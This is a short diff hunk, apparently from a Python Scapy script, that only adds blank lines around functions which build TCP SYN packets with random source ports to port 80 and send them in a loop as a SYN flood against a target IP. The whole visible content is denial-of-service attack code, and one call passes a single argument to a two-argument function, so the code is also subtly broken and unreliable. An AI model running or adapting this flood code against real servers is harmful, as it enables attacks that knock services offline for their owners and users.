@@ -11,9 +11,14 @@ def gen_syn(total,dst_ip):
         tcp = TCP(sport=random_sPort, dport=80, flags='S', seq=11111)
         pkt = (ip / tcp)
         yield pkt
+
+
 def send_pkt(pkt_num,dst_ip):
     for pkt in gen_syn(pkt_num):
         send(pkt)
+
+
+
 def syn_flood(num,total,dst_ip):
     pkt_num=int(total/num)
     for i in range(num):
